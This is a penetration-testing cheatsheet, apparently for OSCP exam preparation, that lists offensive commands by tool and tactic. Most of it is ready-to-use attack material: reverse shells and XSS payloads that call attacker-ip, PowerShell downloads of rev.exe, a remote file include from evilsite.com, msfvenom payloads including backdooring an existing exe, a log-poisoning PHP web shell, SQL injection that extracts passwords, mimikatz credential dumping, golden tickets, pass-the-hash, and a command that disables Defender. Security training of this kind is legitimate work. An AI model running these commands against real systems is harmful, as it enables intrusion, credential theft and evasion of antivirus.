# OSCP-Cheatsheet

# nmap
- service: all
- tactics: enumeration

## enumerate services and use default scripts  
- `nmap -sC -sV -oN normal.txt target-ip`

## scan all tcp ports  
- `nmap -p- -oN all_ports.txt target-ip`

## scan all udp ports  
- `nmap -p- -sU -oN all_udp_ports.txt target-ip`

## use script categories  
- `nmap --script vuln,safe,discovery -oN scan.txt target-ip`

## list all nse scripts  
- `ls -lh /usr/share/nmap/scripts/`

## nmap through socks4 proxy  
- `nmap --proxies socks4://proxy-ip:1080 target-ip`

## ftp bounce scan
- `nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv`

---

# gobuster
- service: http
- tactics: enumeration

## bruteforce webdirectories and files by extention
- `gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30`

---

# wfuzz
- service: http
- tactics: enumeration

## bruteforce web parameter
- `wfuzz -u http://target-ip/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt`

## bruteforce post data (login)
- `wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt`

---

# fuff
- service: http
- tactics: enumeration

## bruteforce web directories
- `ffuf -w /path/to/wordlist -u https://target/FUZZ`

---

# davtest
- service: webdav
- tactics: enumeration

## tries to upload (executable) files to webdav
- `davtest -url http://target-ip/ -sendbd auto`

---

# peass - privilege escalation awesome scripts suite
- service: windows
- service: linux
- tactics: enumeration

## very easy to use on linux
- `./linpeas.sh`

## windows has multiple versions
- `winpeasx64.exe`
- `winpeasx86.exe`
- `winpeas.bat`

---

# capabilities
- service: linux
- tactics: privilege_escalation

```
# Check the links at the bottom for more examples and explanation
```
## exploit `cap_setuid` capability on python3 to gain a local root-shell
- `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

---

# mount
- service: smb
- tactics: enumeration
- tactics: inital_access

## mount shares
- `mount -o hard,nolock target-ip:/home folder`
- `mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder`

---

# showmount
- service: smb
- tactics: enumeration

## list Shares
- `showmount -e target-ip`

---

# enum4linux
- service: all
- tactics: enumeration

## scan target-ip
- `enum4linux target-ip`

---

# rpcdump.py
- service: rpc
- tactics: enumeration
- suites: impacket

## dump rpc endpoints
- `/opt/impacket/examples/rpcdump.py username:password@target-ip`

---

# lookupsid.py
- service: rpc
- tactics: enumeration
- suites: impacket

## get sid via rpc
- `/opt/impacket/examples/lookupsid.py username:password@target-ip`

---

# smbclient.py
- service: smb
- tactics: enumeration
- tactics: inital_access
- suites: impacket

## semi-interactive smb-client
- `python3 /opt/impacket/examples/smbclient.py username@target-ip`
- `python3 /opt/impacket/examples/smbclient.py 'username'@target-ip`
- `python3 /opt/impacket/examples/smbclient.py ''@target-ip`

---

# snmpwalk
- service: snmp
- tactics: enumeration

## gather snmp v1 information with standard community strings
- `snmpwalk -v1 -c public target-ip`
- `snmpwalk -v1 -c private target-ip`
- `snmpwalk -v1 -c manager target-ip`

## enumerate windows users
- `snmpwalk -c public -v1 target-ip 1.3.6.1.4.1.77.1.2.25`
    
## enumerate current windows processes
- `snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.4.2.1.2`
    
## enumerate windows open tcp ports
- `snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.6.13.1.3`
 
## enumerate installed software
- `snmpwalk -c public -v1 target-ip 1.3.6.1.2.1.25.6.3.1.2`

---

# onesixtyone
- service: snmp
- tactics: enumeration

## bruteforce community strings
```
echo public > community.txt
echo private >> community.txt
echo manager >> community.txt
for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
```

- `onesixtyone -c community.txt -i target-ip.txt`

---

# rpcclient
- service: rpc 
- tactics: enumeration
- tactics: inital_access

## get information via rpc with username
- `rpcclient -U username target-ip`

## get information via rpc without username
- `rpcclient -U "" target-ip`

### sub-commands once connected
- `srvinfo`
- `lookupnames username`

---

# ftp
- service: ftp
- tactics: enumeration
- tactics: inital_access

## login via ftp
- `ftp target-ip`

### anonymous login
- `username: anonymous`
- `password: anonymous`

---

# XML External Entity (XXE)

- service: http
- tactics: enumeration
- tactics: inital_access

## Read local files

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```

## Read binary or files that otherwise can't be display (.php)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
                <foo>
                <something>&xxe;</something>
                </foo>
```

---

# Java-Web-Token (JWT)

- service: http
- tactics: inital_access

## Sign JWT with own key - might need a webserver serving the private key

```python
python3 jwt_tool.py [eyJ0eXAiOiJKV1QiLCJhbG..snip..] -I -hc kid -hv "http://<IP>/jwt.pub" -pc <admin_cap> -pv <1> -S rs256 -pr jwt.key
```

---

# ldapsearch
- service: ldap
- tactics: discovery

`ldapsearch -x -h target-ip -b "dc=domain,dc=tld"`

---

# windapsearch.py
- service: ldap
- tactics: discovery

# 
- `./windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U`

---

# evil-winrm
- service: winrm
- tactics: lateral_movement

# get shell via evil-winrm
- `./evil-winrm.rb -u username -p password -i target-ip`

---

# telnet
- service: smtp
- service: pop
- serivce: telnet
- tactics: collection

## send mail via telnet

```
# connect
telnet target-ip 25

# provide valid or fake email-address
EHLO username@domain.tld

# set mail-from
MAIL FROM: <username@domain>

# set recipient-to
RCPT TO: <target-username@target-domain.tld>

# set body and sent mail
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: username@domain

Hallo World!
.
```

## get mails via pop3

```
# connect
telnet target-ip 110

# login
USER username
PASS password

# list emails
LIST

# retrieve emails
RETR 1
```

---

# nikto
- service: http
- tactics: enumeration

## scan website for vulnerabilities
- `nikto -C all -h http://target-ip`

---

# wpscan
- service: http
- tactics: enumeration

## scan wordpress installation for vulnerabilities
- `wpscan --url http://target-ip/ --enumerate p`

---

# nc
- service: all
- tactics: enumeration
- tactics: inital_access

## logfile injection
```
nc target-ip target-port
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <IP>
Connection: close
```
        
### Afterwards include the it via lfi
- `?lfi_file=/var/log/apache2/access.log&cmd=<command>`

---

# dig
- service: dns
- tactics: enumeration

## full zone transfer
- `dig -t AXFR target-dns-ip`

---

# host
- service: dns
- tactics: enumeration

## full zone transfer
- `host -l target-dns-ip`

---

# mysqldump
- service: sql
- tactics: initial_access

## backup all mysql databases
- `mysqldump -u username -ppassword --all-databases --single-transaction`

---

# sqli
- service: sql
- service: http
- tactics: inital_access

## check if you can find a row, where you can place your output  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`

## get the version of the database  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5`

## get the current user  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,user(),5`

## see all tables  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables`

## get column names for a specified table  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'`

## concat user names and passwords (0x3a represents “:”)  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users`

## write into a file  
- `http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'`

---

# searchsploit
- service: all
- tactics: enumeration

# filter search for specific kernel versions
- `searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6`

---

# curl
- service: http
- service: imap
- tactics: exfiltration

## download emails via curl
- `curl --insecure --url "imaps://target-domain/Drafts;UID=4" --user "username:password"`

## bypass useragent blacklisting
- `curl -A "Googlebot" http://target-ip/robots.txt`

---

# scp
- service: ssh
- tactics: inital_access

## copy file to target
- `scp -r username@target-ip:/path/to/foo /home/username/desktop/`

---

# ssh
- service: ssh
- tactics: inital_access
- tactics: lateral_movement

## create ssh-key
- `ssh-keygen`

### add public-key to authorized_keys
- `cat rsa.pub >> authorized_keys`

### set permission on private-key
- `chmod 600 id_rsa`

## login via ssh-key
- `ssh -i id_rsa username@target-ip`

### login with older ciphers
- `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc username@target-ip`

## start tool after ssh login
- `ssh username@target-ip -o "ProxyCommand=ncat --proxy-type http --proxy target-ip:proxy-port 127.0.0.1 22"`

## ssh port forwarding
- `ssh -N -L 80:127.0.0.1:80 username@target-ip`

## dynamic ssh port forward
- `ssh -N -D 9050 username@target-ip`

---

# proxychains
- service: ssh
- tactics: lateral_movement

## a dynamic ssh tunnel is needed
> search ssh

## Use `proxychains + command" to use the socks proxy
- `proxychains nmap -sTV -n -PN -p 80,22 target-ip -vv`
 
> Double pivot works the same, but you create the 2nd ssh tunnel via proxychains and a different dynamic port. 
After the tunnel is up, you can comment out the first socks entry in proxychains config.

---

# sshuttle
- service: ssh
- tactics: lateral_movement

## pivot via sshuttle
- `sshuttle -vr <via-ssh-server> <Remote-Net-To-Route>`
- `sshuttle -vr username@target-ip 10.1.1.0/24`

---

# smbmap
- service: smb
- tactics: discovery

## guest login
- `smbmap -u whateverusername -H target-ip`

## anonymous login
- `smbmap -H target-ip`

---

# smbserver.py
- service: smb
- tactics: exfiltration
- suites: impacket

## fake smb server for uploading and downloading files
- `python3 /opt/impacket/examples/smbserver.py -smb2support files $(pwd)`

---

# pth-smbclient
- service: smb
- service: ntlm
- tactics: lateral_movement
- suites: pth-toolkit

## connect to target-share and auth via ntlm-hash
- `pth-smbclient --user=username --pw-nt-hash -m smb3 \\\\target-ip\\target-share ntlm-hash`

---

# pth-winexe
- service: smb
- service: ntlm
- tactics: lateral_movement
- suites: pth-toolkit

# run command on target-ip and auth via ntlm-hash
- `pth-winexe -U ntlm-hash //target-ip cmd`

---

# vinagre
- service: vnc
- tactics: lateral_movement

# vnc connect
- `vinagre`

---

# medusa
- service: http
- service: basic_auth
- tactics: credential_access

## bruteforce basic_auth
- `medusa -h target-ip -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10`

---

# hydra
- service: http
- service: http_post
- service: sql
- tactics: credential_access

## bruteforce http_post with example post-data
- `hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^:
Login failed!"`

## bruteforce mssql
- `hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql`

---

# patator
- service: ssh
- tactics: credential_access

## bruteforce ssh
- `patator ssh_login host=target-ip port=22 user=username password=FILE0 0=/opt/SecLists/Passwords/probable-v2-top1575.txt`
- Optional: `-x ignore:fgrep='failed.'`

---

# burp
- service: http
- tactics: enumeration

## bypass ip blacklist / whitelist
- `X-Forwarded-For: $allowed-ip`

---

# xss payloads
- service: http
- tactics: inital_access

## xss enumeration payloads
- `'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appName;</script>`
- `'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appVersion;</script>`
- `'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>`

## xss redirect to own webserver
- `'">><script>document.location="http://attacker-ip:81";</script>`
- `'">><script>window.location="http://attacker-ip:81";</script>`

---

# local file inclusion / remote file inclusion
- service: http
- service: php
- tactics: inital_access

## including remote code
- `?file=[http|https|ftp]://evilsite.com/shell.txt`

## using php stream php://input 
- `?file=php://input`  

## using zip wrapper zip://input 
- `?file=zip://path/file.zip%23rce.php`

## specify your payload in the post parameters
### using php stream php://filter
- `?file=php://filter/convert.base64-encode/resource=index.php`

### using data uri
- `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`

### using xss
- `?file=http://127.0.0.1/path/xss.php?xss=phpcode`

## inject php code in logfile with nc and retrieve it afterwards
> search for nc

--- 

# mssqlclient.py
- service: sql
- tactics: lateral_movement
- suites: impacket

## connect to windows mssql Server
- `mssqlclient.py -windows-auth username@target-ip`

---

# mssql-cli
- service: sql
- tactics: lateral_movement

## connect to windows mssql Server
- `mssql-cli -S target-ip -U username`

---

# bloodhound
- service: ldap
- serivce: active_directory
- tactics: lateral_movement
- tactics: privilege_escalation

## invoke-bloodhound from sharphound.ps1 
- `import-module .\sharphound.ps1`
- `invoke-bloodHound -CollectionMethod All -domain target-domain -LDAPUser username -LDAPPass password`

---

# getnpusers.py
- service: kerberos
- tactics: credential_access
- tactics: lateral_movement

## check ASREPRoast for all domain users (credentials required)
- `python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>`

## check ASREPRoast for a list of users (no credentials required)
- `python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>`

## check kerberoast
- `python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format hashcat`

## crack as_rep_response_file
> search for hashcat / john

---

# hashcat
- service: all
- tactics: credential_access

## crack as_rep_response_file (asreproast)
- `hashcat -m 18200 -a 0 as_rep_response_file passwords_file`

## crack as_rep_response_file (kerberoast)
- `hashcat -m 13100 --force TGSs_file passwords_file`

--- 

# john
- service: all
- tactics: credential_access

## crack as_rep_response_file (asreproast)
- `john --wordlist=passwords_file as_rep_response_file`

## crack as_rep_response_file (kerberoast)
- `john --format=krb5tgs --wordlist=passwords_file AS_REP_responses_file`

## mangle wordlist
- `john --wordlist=month --rules --stdout > new_list`

## crack ssh keys
- `/usr/share/john/ssh2john.py id_rsa > hash.john`
- `john --wordlist=/usr/share/wordlists/rockyou.txt hash.john`

---

# secretsdump.py
- service: kerberos
- tactics: credential_access
- suites: impacket

## dcsync
- `/usr/share/doc/python3-impacket/examples/secretsdump.py username@target-ip -dc-ip target-ip`

---

# invoke-kerberoast.ps1
- service: kerberos
- tactics: credential_access
- suites: powershell_empire

## execute invoke-kerberoast.ps1
- `invoke-kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>`

---

# gettgt.py
- service: kerberos
- tactics: credential_access
- suites: impacket

## overpass the hash

## Request the TGT with hash
- `python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>`

## Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
- `python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>`

## Request the TGT with password
- `python getTGT.py <domain_name>/<user_name>:[password]`

## Set the TGT for impacket use
- `export KRB5CCNAME=<TGT_ccache_file>`

### Execute remote commands with any of the following tools by using the TGT
> search for psexec.py, smbexec.py or wmiexec.py

---

# ticket_converter.py
- service: kerberos
- tactics: credential_access

## convert tickets between linux / windows format
[ticket_converter.py](https://github.com/Zer1t0/ticket_converter):

- `python ticket_converter.py ticket.kirbi ticket.ccache`
- `python ticket_converter.py ticket.ccache ticket.kirbi`

### to use ticket 
> search for gettgt.py 

---

# mimikatz
- service: kerberos
- tactics: credential_access

## enable log
- `log filename.log`

## enable debug mode
- `privilege::debug`

## dump passwords from memory
- `sekurlsa::logonpasswords`

## dump passwords from sam database
- `lsadump::sam /system:f:\SYSTEM /sam:f:\SAM`

## export tickets
- `sekurlsa::tickets /export`

## pass the hash
- `sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash`

## silver_ticket
### to generate the TGS with NTLM
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`

### to generate the TGS with AES 128 key
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`

### to generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>`

### Inject TGS with mimikatz
- `mimikatz # kerberos::ptt <ticket_kirbi_file>`

## golden_ticket

### to generate the TGT with NTLM
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>`

### to generate the TGT with AES 128 key
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>`

### to generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
- `mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>`

### inject TGT with mimikatz
- `mimikatz # kerberos::ptt <ticket_kirbi_file>`

---
# ticketer.py
- service: kerberos
- tactics: credential_access
- suites: impacket

## silver_ticket

### to generate the TGS with NTLM
- `python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>`

### to generate the TGS with AES key
- `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>`

### set the TGT for impacket use
- `export KRB5CCNAME=<TGT_ccache_file>`

## golden_ticket

### to generate the TGT with NTLM
- `python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>`

### to generate the TGT with AES key
- `python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>`

### set the ticket for impacket use
- `export KRB5CCNAME=<TGS_ccache_file>`

> search for psexec.py, smbexec.py or wmiexec.py

---

# psexec.py
- service: rpc
- tactics: lateral_movement
- suites: impacket

## Execute remote commands with any of the following by using the TGT
- `python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass`

---
# smbexec.py
- service: smb
- tactics: lateral_movement
- suites: impacket

## Execute remote commands with any of the following by using the TGT
- `python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass`

---

# wmiexec.py
- service: wmi
- tactics: lateral_movement
- suites: impacket

## Execute remote commands with any of the following by using the TGT
- `python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass`

---

# psexec.exe
- service: smb
- tactics: lateral_movement
- suites: pstools

## run psexec
- `.\PsExec.exe -accepteula \\<remote_hostname> cmd`
- `PsExec64.exe \\remote_hostname> -u <username> -p <password> shell64.exe`

---

# gcc
- service: all
- tactics: weaponization

## cross compile for 32bit (m32) and all linux flavors (gnu, sysv)
- `apt-get install libc6-dev-i386`
- `gcc -m32 -Wall -Wl,--hash-style=both 9545.c -o exploit`

## cross compile for 32Bit windows (on 64bit linux)
- `i686-w64-mingw32-gcc -o ms11-046.exe ms11-046.c -lws2_32`

## cross compile for 32bit windows (on 32bit linux)
- `apt-get install mingw32`
- `i586-mingw32msvc-gcc <source>.c -o <outfile> -lws2_32`

## static application
> To compile static applications use the “-static” parameter additionally

## skelleton c code which calls system()

```
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}
```

---

# pyinstaller.py
- serivce: all
- tactics: weaponization

## generate exe from python file in windows
- `python pyinstaller.py --onefile <pythonscript>`

---

# reg.exe
- service: sam
- tactics: credential_access

## dump sam database
- `reg save HKLM\sam sam`
- `reg save HKLM\system system`

## query vnc passwords
- `reg query "HKCU\Software\ORL\WinVNC3\Password"`

## Windows autologin
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`

---

# samdump2
- service: sam
- tactics: credential_access

- `samdump2 SYSTEM SAM > hashes.db`

---

# unshadow
- service: sam
- tactics: credential_access

## unshadow /etc/passwd file
- `unshadow shadow passwd > unshadow.db`

---

# plink.exe
- service: all
- tactics: lateral_movement

## Port forward using plink
- `plink.exe -l username -pw password target-ip -R 8080:127.0.0.1:8080`

---

# socat
- serivce: all
- tactics: command_and_control

# reverse_shell
## attacker
- ``socat file:`tty`,raw,echo=0 tcp-listen:12345``

## target:
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker-ip:12345"`

---

# runas
- serivce: windows
- tactics: privilege_escalation

## privileged file copy
- `runas /user:hostname\Administrator /savecred "cmd.exe /c type c:\users\administrator\desktop\root.txt > C:\Users\security\AppData\Local\Temp\root.txt"`

## privileged powershell execution
- `runas /user:hostname\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\boom.ps1"`

## privileged cmd execution
- `runas /user:administrator /savecreds cmd.exe`

---

## powershell
- serivce: windows
- tactics: execution

### powershell upload
- `powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"`
- `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://attacker-ip/rev.exe', 'C:\ProgramData\')"`

### powershell disable av 
- `Set-MpPreference -DisableRealtimeMonitoring $true`

---

# potato.exe
- serivce: windows
- tactics: privilege_escalation

## hot potato usage
- `potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true`

---

# Metasploit
- serivce: all
- tactics: command_and_control

## Port forward using meterpreter
- `portfwd add -l <attacker port> -p <victim port> -r <victim ip>`
- `portfwd add -l 3306 -p 3306 -r 192.168.1.101`

---

# msfvenom
- serivce: all
- tactics: weaponization

## Linux ELF binary
- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`

## Windows EXE binary 
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`

### 32 Bit
- `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell32.exe`

### 64Bit
- `msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell64.exe`
    
## Windows Service
- `msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe`
    
## Mac
- `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
    
## PHP 
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php`

> If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.
    
## ASP 
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`    

## JSP
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
    
## WAR
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
    
## Inject payload into an existing exe file
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>` 

## dep bypass payload
- `windows/meterpreter/reverse_nonx_tcp`

## multi handler
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/migrate
set lhost 10.10.12.102
set lport 9001
exploit
```
--- 

# misc
## python injected shell
- `__builtins__.__import__('os').system('/bin/bash -i')`

# exploit development
## finding offset
### gef
- `pattern create 128`
- `pattern search 0x6161616`

### msf
- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000`
- `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP-Content>`

### pwntools
```python3
from pwn import *
# n = 4 == 32Bit; n = 8 == 64 Bit
cyclic(128, n=4)
cyclic_find('6161616', n=4)
Where 61616161 = value not address
```

# find "jmp esp" with mona.py
- `!mona find -type instr -s "jmp esp" -m <DLL>`

# list of bad characters
```python
b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
```

# gdb
## list memory of process
- `info files`

## find "jmp esp" with gdb
- `find /b <from addr>, <to addr>, 0xff, 0xe4`

## list shared modules
- `info sharedlibrary`

## serve binary via network
- `socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./binary"`


# helper functions
```python
import struct

def p64(x):
    return pack("<Q", x)

def p32(x):
    return pack("<L", x)
```

# command shell skelleton
```python
#!/usr/bin/python3
import requests
from cmd import Cmd

class Terminal(Cmd):
  prompt = '> '

  def default(self, args):
    RunCmd(args)

def RunCmd(cmd):
  data = {'property' : f'string {cmd}'}
  req = requests.post('http://', data=data)

term = Terminal()
term.cmdloop()
```

# interactive shells 
## cat technique
- `(cat exploit.txt; cat) | ./vulnapp`

---

## external ressources

### cheatsheets
[Cheatsheet-God](https://github.com/OlivierLaflamme/Cheatsheet-God)  

### compiling exploits
[https://medium.com](https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c)  

### pivoting
[https://www.ivoidwarranties.tech - (proxychains)](https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains)  
[https://posts.specterops.io - (ssh tunnels guide)](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)  

### mimikatz
[mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)  

### upgrade shell to meterpreter and bypass applocker
[https://mlcsec.com](https://mlcsec.com/shell-upgrade-cheat-sheet/#msbuildexe)  

### powershell
[https://burmat.gitbook.io](https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts)  

### SQLi
[http://securityidiots.com](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)  

### LFI / RFI
[https://websec.wordpress.com](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)  

### kerberosting & as_rep roasting
[https://en.hackndo.com](https://en.hackndo.com/kerberoasting/)  
[https://luemmelsec.github.io](https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/)  

### kerberos
[https://www.roguelynn.com](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)  

### oscp
[https://github.com/xMilkPowderx](https://github.com/xMilkPowderx/OSCP)  
[Awesome-oscp](https://github.com/0x4D31/awesome-oscp)  

### linux privilege escalation
[https://blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)  
[hacktricks-capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)  
[https://gtfobins.github.io](https://gtfobins.github.io/)  

### windows privilege escalation
[https://github.com/frizb](https://github.com/frizb/Windows-Privilege-Escalation)  
[https://github.com/xapax](https://github.com/xapax/security/blob/master/privilege_escalation_windows.md)  
[http://travisaltman.com](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)  
[http://www.fuzzysecurity.com](http://www.fuzzysecurity.com/tutorials/16.html)  
[https://www.offensive-security.com](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)  
[http://it-ovid.blogspot.cl](http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html)  
[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)  
[http://bernardodamele.blogspot.cl](http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html)  
[http://www.harmj0y.net](http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)  
